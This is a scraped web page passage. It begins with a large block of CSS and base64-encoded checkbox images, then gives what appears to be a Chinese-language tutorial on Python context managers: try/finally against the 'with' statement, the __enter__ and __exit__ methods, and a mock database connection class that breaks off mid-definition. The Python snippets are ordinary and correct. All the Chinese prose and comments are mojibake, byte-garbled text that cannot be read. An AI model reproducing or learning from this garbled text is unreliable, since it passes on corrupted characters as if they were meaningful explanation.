kMblfRXLbhEoFIdDTBdhldvzl+3CMg60ZktI2vNzLW6IIp0waLklot9L63yzuUp8dJd7bglPFe3hIXstBEP58/s6Ocyr4rH2+866ZNbriTzA0RSOWCwakMl1QJgculxPt8Z7O5GLdtW6bvU8R/nO1vb+hMExVAVtEAAAAASUVORK5CYII=");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>å¼•è¨€ï¼šä¸Šä¸‹æ–‡ç®¡ç†å™¨æ˜¯ Python ä¸­å¤„ç†èµ„æºåˆ†é…ä¸é‡Šæ”¾çš„æ ¸å¿ƒç‰¹æ€§ï¼Œå®ƒé€šè¿‡ç®€æ´çš„Â <code>with</code>Â è¯­å¥ï¼Œè®©æ–‡ä»¶æ“ä½œã€æ•°æ®åº“è¿æ¥ã€ç½‘ç»œå¥—æ¥å­—ç­‰èµ„æºçš„ç®¡ç†å˜å¾—ä¼˜é›…ä¸”å®‰å…¨ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„æ ¸å¿ƒä»·å€¼</h2>
<p>åœ¨ Python ç¼–ç¨‹ä¸­ï¼Œèµ„æºæ“ä½œï¼ˆå¦‚æ‰“å¼€æ–‡ä»¶ã€åˆ›å»ºæ•°æ®åº“è¿æ¥ï¼‰æœ‰ä¸€ä¸ªé€šç”¨è¦æ±‚ï¼š<strong>ä½¿ç”¨åå¿…é¡»é‡Šæ”¾</strong>ï¼Œå¦åˆ™ä¼šå¯¼è‡´èµ„æºæ³„æ¼ï¼ˆå¦‚æ–‡ä»¶å¥æŸ„è€—å°½ã€æ•°æ®åº“è¿æ¥æ± å æ»¡ï¼‰ã€‚
ä¼ ç»Ÿæ–¹å¼éœ€è¦æ‰‹åŠ¨é€šè¿‡Â <code>try/finally</code>Â ä¿è¯èµ„æºé‡Šæ”¾ï¼Œä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ‰‹åŠ¨ç®¡ç†æ–‡ä»¶èµ„æº</span>
f = <span class="hljs-literal">None</span>
<span class="hljs-keyword">try</span>:
    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"r"</span>)
    content = f.read()
    <span class="hljs-built_in">print</span>(content)
<span class="hljs-keyword">finally</span>:
    <span class="hljs-keyword">if</span> f:
        f.close()
</code></pre>
<p>è¿™ç§å†™æ³•ä¸ä»…å†—ä½™ï¼Œè¿˜å®¹æ˜“å› ç–å¿½é—æ¼é‡Šæ”¾é€»è¾‘ã€‚è€Œä¸Šä¸‹æ–‡ç®¡ç†å™¨ç»“åˆÂ <code>with</code>Â è¯­å¥ï¼Œå¯å°†ä¸Šè¿°ä»£ç ç®€åŒ–ä¸ºï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¸Šä¸‹æ–‡ç®¡ç†å™¨è‡ªåŠ¨ç®¡ç†èµ„æº</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> f:
    content = f.read()
    <span class="hljs-built_in">print</span>(content)
</code></pre>
<p><code>with</code>Â ä»£ç å—æ‰§è¡Œå®Œæ¯•åï¼Œæ— è®ºæ˜¯å¦å‘ç”Ÿå¼‚å¸¸ï¼Œæ–‡ä»¶éƒ½ä¼šè¢«è‡ªåŠ¨å…³é—­ â€”â€” è¿™å°±æ˜¯ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„æ ¸å¿ƒä½œç”¨ï¼š<strong>è‡ªåŠ¨å®Œæˆèµ„æºçš„è·å–ä¸é‡Šæ”¾</strong>ã€‚</p>
<h2 data-id="heading-1">äºŒã€ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„å®ç°åŸç†</h2>
<p>ä¸Šä¸‹æ–‡ç®¡ç†å™¨çš„æ ¸å¿ƒæ˜¯å®ç°ä¸¤ä¸ªç‰¹æ®Šæ–¹æ³•ï¼š</p>
<ol>
<li><code>__enter__(self)</code>ï¼šè¿›å…¥Â <code>with</code>Â ä»£ç å—æ—¶æ‰§è¡Œï¼Œè¿”å›éœ€è¦è¢«ç®¡ç†çš„èµ„æºï¼ˆå¦‚æ–‡ä»¶å¯¹è±¡ï¼‰ï¼›</li>
<li><code>__exit__(self, exc_type, exc_val, exc_tb)</code>ï¼šé€€å‡ºÂ <code>with</code>Â ä»£ç å—æ—¶æ‰§è¡Œï¼Œè´Ÿè´£é‡Šæ”¾èµ„æºï¼Œè¿˜å¯å¤„ç†å¼‚å¸¸ã€‚</li>
</ol>
<h3 data-id="heading-2">æ–¹æ³•å‚æ•°è¯´æ˜</h3>
<ul>
<li><code>exc_type</code>ï¼šå¼‚å¸¸ç±»å‹ï¼ˆè‹¥ä»£ç å—æ— å¼‚å¸¸åˆ™ä¸ºÂ <code>None</code>ï¼‰ï¼›</li>
<li><code>exc_val</code>ï¼šå¼‚å¸¸å®ä¾‹ï¼ˆè‹¥ä»£ç å—æ— å¼‚å¸¸åˆ™ä¸ºÂ <code>None</code>ï¼‰ï¼›</li>
<li><code>exc_tb</code>ï¼šå¼‚å¸¸è¿½è¸ªæ ˆï¼ˆè‹¥ä»£ç å—æ— å¼‚å¸¸åˆ™ä¸ºÂ <code>None</code>ï¼‰ï¼›</li>
<li><code>__exit__</code>Â è¿”å›Â <code>True</code>Â æ—¶ï¼Œä¼šæŠ‘åˆ¶ä»£ç å—ä¸­æŠ›å‡ºçš„å¼‚å¸¸ï¼›è¿”å›Â <code>False</code>ï¼ˆé»˜è®¤ï¼‰åˆ™ä¼šæ­£å¸¸æŠ›å‡ºå¼‚å¸¸ã€‚</li>
</ul>
<h3 data-id="heading-3">è‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨ç¤ºä¾‹</h3>
<p>ä»¥ã€Œæ¨¡æ‹Ÿæ•°æ®åº“è¿æ¥ã€ä¸ºä¾‹ï¼Œå®ç°ä¸€ä¸ªè‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DatabaseConnection</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, db_name</span>):
        self.db_name = db_name
        self.connection = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__enter__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment"># æ¨¡æ‹Ÿå»ºç«‹æ•°æ®åº“è¿æ¥</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"è¿æ¥æ•°æ®åº“ <span class="hljs-subst">{self.db_name}</span>"</span>)
        self.connection = <span class="hljs-string">f"DB_CONN_<span class="hljs-subst">{self.db_name}</span>"</span>
        <span class="hljs-keyword">return</span> self.connection  <span class="hljs-comment"># ä½œä¸º with è¯­å¥ä¸­ as åçš„å˜é‡</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__exit__</span>(<span class="hljs-params">self, exc_type, exc_val, exc_tb</span>):
        <span class="hljs-comment"># æ¨¡æ‹Ÿå…³é—­æ•°æ®åº“è¿æ¥</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å…³é—­æ•°æ®åº“ <span class="hljs-subst">{self.db_name}</span> çš„è¿æ¥"</span>)
